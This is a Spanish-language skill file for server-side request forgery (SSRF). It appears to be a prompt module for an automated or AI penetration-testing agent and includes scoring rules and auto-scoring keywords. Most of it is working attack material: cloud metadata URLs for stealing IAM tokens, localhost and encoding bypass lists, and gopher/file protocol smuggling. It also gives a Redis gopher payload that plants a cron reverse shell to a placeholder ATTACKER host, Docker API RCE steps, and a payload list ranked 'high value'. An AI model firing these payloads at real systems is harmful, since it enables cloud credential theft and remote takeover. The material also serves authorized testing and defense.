# SKILL: SERVER-SIDE REQUEST FORGERY (SSRF)

<!-- critical -->
SSRF permite al atacante hacer requests desde el servidor hacia redes internas, cloud metadata, o servicios que no están expuestos públicamente. Puede escalar a RCE via Redis, Docker API, o robo de credenciales cloud.
<!-- /critical -->

## 1. SCOPE - Dónde Buscar

<!-- scope -->
- **Parámetros URL**: url=, link=, src=, href=, redirect=, callback=, webhook=, fetch=, load=, proxy=, image=, avatar=
- **Headers**: X-Forwarded-Host, Origin, Referer (cuando el servidor los procesa)
- **Funcionalidades**:
  - Link previews (Slack, Discord clones)
  - PDF generators (wkhtmltopdf, Puppeteer)
  - Image processors (ImageMagick, PIL)
  - Webhook testers
  - Import/Export (URL import)
<!-- /scope -->

## 2. METHODOLOGY

<!-- methodology -->
1. **IDENTIFY**: Encontrar todos los parámetros que aceptan URLs o hostnames
2. **BASELINE**: Enviar URL a tu OOB server, confirmar que el SERVER hace el request (no client-side)
3. **INTERNAL**: Probar direcciones internas (127.0.0.1, 169.254.169.254, 10.x.x.x)
4. **BYPASS**: Si hay filtros, probar bypasses (encoding, redirects, DNS rebinding)
5. **ESCALATE**: Si hay acceso interno, probar cloud metadata, Redis, Docker
<!-- /methodology -->

## 3. KNOWLEDGE BASE

<!-- knowledge -->

### Cloud Metadata Endpoints

**AWS EC2:**

- IMDSv1 (legacy): `http://169.254.169.254/latest/meta-data/`
- IMDSv1 credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]`
- IMDSv2 (requiere token):

  ```bash
  PUT http://169.254.169.254/latest/api/token
  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
  → Devuelve TOKEN
  GET http://169.254.169.254/latest/meta-data/
  Header: X-aws-ec2-metadata-token: [TOKEN]
  ```

- ECS Task credentials: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

**GCP:**

- Endpoint: `http://metadata.google.internal/computeMetadata/v1/`
- Header REQUERIDO: `Metadata-Flavor: Google`
- Token: `/instance/service-accounts/default/token`
- Project: `/project/project-id`

**Azure:**

- Endpoint: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- Header REQUERIDO: `Metadata: true`
- MSI Token: `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

**Kubernetes:**

- Kubelet (read-only): `http://localhost:10255/pods`
- Kubelet (authenticated): `https://localhost:10250/pods`
- API Server: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
- Service Account Token: `/var/run/secrets/kubernetes.io/serviceaccount/token`

### Bypass Techniques

**Localhost variants:**

```text
127.0.0.1
127.1
127.0.1
0.0.0.0
0
localhost
[::1]
[::ffff:127.0.0.1]
127.0.0.1.nip.io
2130706433 (decimal)
0x7f000001 (hex)
017700000001 (octal)
```

**Protocol smuggling:**

```http
gopher://127.0.0.1:6379/_INFO%0D%0A
dict://127.0.0.1:6379/INFO
file:///etc/passwd
ftp://internal-ftp/
```

**Encoding bypasses:**

```http
http://127.0.0.1 → http://127%2e0%2e0%2e1
http://127.0.0.1 → http://127。0。0。1 (Unicode dots)
http://localhost → http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ (Unicode)
```

**Redirect bypass:**

```http
https://attacker.com/redirect?url=http://169.254.169.254/
```

**DNS Rebinding:**

```text
Dominio que resuelve primero a IP externa, luego a 127.0.0.1
```

### Chaining Opportunities

**SSRF → Redis → RCE:**

```bash
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASET%20x%20"\\n** ** * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n"%0D%0ASAVE%0D%0A
```

**SSRF → Docker API → RCE:**

```http
GET http://127.0.0.1:2375/containers/json
POST http://127.0.0.1:2375/containers/create (con command malicioso)
```

**SSRF → FastCGI → PHP RCE:**

```bash
gopher://127.0.0.1:9000/... (FastCGI records crafted)
```

<!-- /knowledge -->

## 4. SCORING GUIDE

<!-- scoring_guide -->

| Score | Criterio | Ejemplo |
| :--- | :--- | :--- |
| **9-10** | OOB callback desde servidor, metadata leído, credenciales obtenidas | "ACCESS_KEY_ID" en respuesta, callback en Interactsh |
| **7-8** | Puerto interno responde diferente, DNS interno resuelve | Connection refused a puerto interno, timeout diferente |
| **5-6** | Request procesado pero bloqueado, error específico de filtro | "Domain not allowed", "Invalid protocol" |
| **3-4** | Solo nombre de parámetro sugiere SSRF, sin evidencia | param=webhook sin test, URL reflejada sin fetch |
| **0-2** | Client-side fetch, display only, lab seguro | JavaScript hace el fetch, "EXPECTED: SAFE" |

**AUTO-SCORING KEYWORDS:**

- 9-10: "AWS_", "ACCESS_KEY", "gcp_credentials", "root:x:0:0", "HTTP callback received"
- 7-8: "Connection refused", "No route to host" (para IPs internas), "Timeout" diferencial
- 5-6: "Domain not allowed", "Blocked", "Invalid scheme"
- 0-2: "display only", "client-side", "EXPECTED: SAFE"

<!-- /scoring_guide -->

## 5. FALSE POSITIVES

<!-- false_positives -->

**RECHAZAR INMEDIATAMENTE:**

1. URL solo se MUESTRA en página sin server fetch
2. JavaScript (client-side) hace el request, no el servidor
3. "EXPECTED: SAFE" en el HTML/código
4. Allowlist estricta sin ningún bypass posible
5. Todos los targets (internos y externos) devuelven exactamente el mismo error
6. Respuesta es claramente mocked/simulada

**NO SON FALSOS POSITIVOS (investigar más):**

- "Domain not allowed" → Puede haber bypass (subdomain, redirect, encoding)
- Timeout → Puede indicar request a red interna lenta
- "Connection refused" → Confirma que el servidor intentó conectar
- Error SSL → El servidor intentó conectar, hay SSRF
- AWS IMDSv2 error → Si pide Token, hay SSRF confirmado

<!-- /false_positives -->

## 6. PAYLOADS

<!-- payloads -->

### HIGH VALUE - Cloud Credentials (PROBAR PRIMERO)

```http
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/instance?api-version=2021-02-01&resource=https://management.azure.com/
```

### MEDIUM VALUE - Internal Services

```http
http://127.0.0.1:6379/INFO
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:2375/containers/json
http://127.0.0.1:5432/
http://localhost:11211/stats
```

### BYPASS PAYLOADS

```http
http://127.1/
http://0x7f000001/
http://2130706433/
http://[::ffff:127.0.0.1]/
http://127.0.0.1.nip.io/
http://foo@127.0.0.1:80/
```

### CONFIRMATION - OOB

```http
http://[INTERACTSH_URL]/ssrf
https://[INTERACTSH_URL]/ssrf-ssl
```

<!-- /payloads -->

## 7. PRO TIPS

<!-- pro_tips -->
1. **OOB primero**: Confirma que el SERVIDOR hace el request, no el browser
2. **IPv6 bypasses**: Muchos WAFs ignoran IPv6 (::ffff:127.0.0.1)
3. **Redirects**: Si hay allowlist, busca open redirect en dominio permitido
4. **IMDSv2**: Si falla IMDSv1, no asumas que no hay SSRF - puede ser IMDSv2
5. **Timing attacks**: Diferencia de tiempo entre IP inexistente vs interna bloqueada
6. **DNS rebinding**: Último recurso para bypasses muy estrictos
7. **Headers propagation**: Si el sink propaga headers, puedes atacar GCP/Azure metadata
8. **Protocols**: gopher:// es tu amigo para Redis/FastCGI/SMTP
<!-- /pro_tips -->
